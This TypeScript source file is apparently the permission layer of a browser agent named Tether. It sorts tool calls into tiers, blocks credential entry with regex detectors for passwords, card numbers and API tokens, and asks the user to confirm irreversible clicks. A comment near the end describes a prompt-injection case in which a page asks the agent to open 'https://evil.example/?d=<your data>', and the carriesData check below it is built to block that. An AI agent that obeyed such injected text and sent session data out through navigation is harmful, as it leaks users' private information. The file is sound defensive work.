import type { SnapshotElement } from './page/types';
import type { ToolCall } from './types';

/**
 * Permission tiers (spec §6.6). Every action is classified before it runs:
 *
 *  read         snapshot, scroll, extract, waitFor, hover — automatic
 *  navigate     links, tabs, ordinary buttons — automatic (domain policy applies)
 *  write        type, select, check — automatic, never into credential fields
 *  irreversible submits, buy/delete/send-like buttons, downloads — the user
 *               confirms each one, seeing the exact element and page
 *
 * `refuse` is not a tier the user can approve: credential entry is never
 * done by the agent.
 */

export type Tier = 'read' | 'navigate' | 'write' | 'irreversible';

export type Verdict =
  | { decision: 'allow'; tier: Tier }
  | { decision: 'confirm'; tier: 'irreversible'; reason: string }
  | { decision: 'refuse'; reason: string };

const IRREVERSIBLE_WORDS =
  /\b(buy|purchase|pay|place order|order now|delete|remove|erase|send|submit|confirm|transfer|unsubscribe|cancel (subscription|account|order)|post|publish|tweet|reply|donate|subscribe|book now|reserve|sign (up|out)|log ?out|deactivate|close account|empty trash)\b/i;

/** Field purposes the agent never types into. */
const CREDENTIAL_AUTOCOMPLETE =
  /\b(current-password|new-password|one-time-code|cc-number|cc-csc|cc-exp(-month|-year)?|cc-name)\b/i;
const CREDENTIAL_NAME =
  /\b(password|passcode|pin|otp|one[- ]time|verification code|security code|cvv|cvc|card number|credit card|iban|routing number|account number|ssn|social security)\b/i;

export function isCredentialField(el: SnapshotElement | undefined): boolean {
  if (!el) return false;
  if (el.type === 'password') return true;
  if (el.autocomplete && CREDENTIAL_AUTOCOMPLETE.test(el.autocomplete)) return true;
  return CREDENTIAL_NAME.test(el.name);
}

/** Text that looks like card numbers, SSNs or API tokens (the agent must not type them either). */
export function looksSecret(text: string): boolean {
  return (
    /\b(?:\d[ -]?){13,19}\b/.test(text) ||
    /\b\d{3}-\d{2}-\d{4}\b/.test(text) ||
    /\b(sk|pk|rk|ghp|gho|xox[bap])[-_][A-Za-z0-9_-]{8,}\b/.test(text)
  );
}

/** A string or number argument as text; anything else as ''. */
const scalar = (v: unknown): string => (typeof v === 'string' || typeof v === 'number' ? String(v) : '');

function label(el: SnapshotElement): string {
  return `${el.role} "${el.name || el.id}"${el.hint ? ` (${el.hint})` : ''}`;
}

export function classify(call: ToolCall, target: SnapshotElement | undefined): Verdict {
  const a = call.args;
  switch (call.name) {
    case 'extract':
    case 'waitFor':
    case 'scroll':
    case 'hover':
    case 'askUser':
    case 'done':
      return { decision: 'allow', tier: 'read' };
    case 'navigate':
    case 'back':
    case 'forward':
    case 'reload':
    case 'newTab':
    case 'switchTab':
    case 'closeTab':
      return { decision: 'allow', tier: 'navigate' };
    case 'type':
    case 'setValue':
    case 'clear': {
      if (isCredentialField(target)) {
        return {
          decision: 'refuse',
          reason: 'Tether never fills in passwords, one-time codes or payment details. Ask the user to do it (askUser).',
        };
      }
      const text = scalar(a.text) || scalar(a.value);
      if (looksSecret(text)) {
        return { decision: 'refuse', reason: 'That looks like a card number, SSN or secret key; the agent never types those.' };
      }
      if (call.name === 'type' && a.submit === true && target?.inForm) {
        return { decision: 'confirm', tier: 'irreversible', reason: `Submit the form after typing into ${label(target)}` };
      }
      return { decision: 'allow', tier: 'write' };
    }
    case 'select':
    case 'check':
      return { decision: 'allow', tier: 'write' };
    case 'pressKey': {
      const key = scalar(a.key);
      if (/^enter$/i.test(key) && target?.inForm) {
        return { decision: 'confirm', tier: 'irreversible', reason: `Press Enter in ${label(target)}, which submits its form` };
      }
      return { decision: 'allow', tier: 'write' };
    }
    case 'click':
    case 'rightClick': {
      if (!target) return { decision: 'allow', tier: 'navigate' };
      if (target.download) return { decision: 'confirm', tier: 'irreversible', reason: `Download from ${label(target)}` };
      if (target.submits) return { decision: 'confirm', tier: 'irreversible', reason: `Submit a form with ${label(target)}` };
      if (IRREVERSIBLE_WORDS.test(target.name)) {
        return { decision: 'confirm', tier: 'irreversible', reason: `Click ${label(target)}` };
      }
      return { decision: 'allow', tier: target.role === 'link' ? 'navigate' : 'write' };
    }
    default:
      return { decision: 'allow', tier: 'read' };
  }
}

/**
 * Navigation as an exfiltration channel: an injected page can ask the agent
 * to "open https://evil.example/?d=<your data>". Refuse a cross-site URL
 * whose query or path carries a long run of text the agent saw in its task,
 * on pages, or in earlier results.
 */
export function carriesData(url: string, fromHost: string, seen: string[]): string | null {
  let u: URL;
  try {
    u = new URL(url);
  } catch {
    return null;
  }
  if (!fromHost || u.hostname === fromHost || u.hostname.endsWith(`.${fromHost}`) || fromHost.endsWith(`.${u.hostname}`)) {
    return null;
  }
  let raw = `${u.pathname} ${u.search} ${u.hash}`.replace(/\+/g, ' ');
  try {
    raw = decodeURIComponent(raw);
  } catch {
    // malformed escapes: match on the raw string
  }
  // Same normalization on both sides: lowercase words of 4+ letters, so
  // short words and punctuation between them can't break up a match.
  const words = (t: string) => t.toLowerCase().split(/[^\p{L}\p{N}]+/u).filter((w) => w.length >= 4);
  const payload = ` ${words(raw).join(' ')} `;
  if (payload.length < 30) return null;
  for (const s of seen) {
    const w = words(s);
    // Any 6 consecutive (significant) words of seen text in the URL is a leak.
    for (let i = 0; i + 6 <= w.length; i++) {
      if (payload.includes(` ${w.slice(i, i + 6).join(' ')} `)) {
        return `The URL would send text from this session to ${u.hostname}`;
      }
    }
  }
  return null;
}
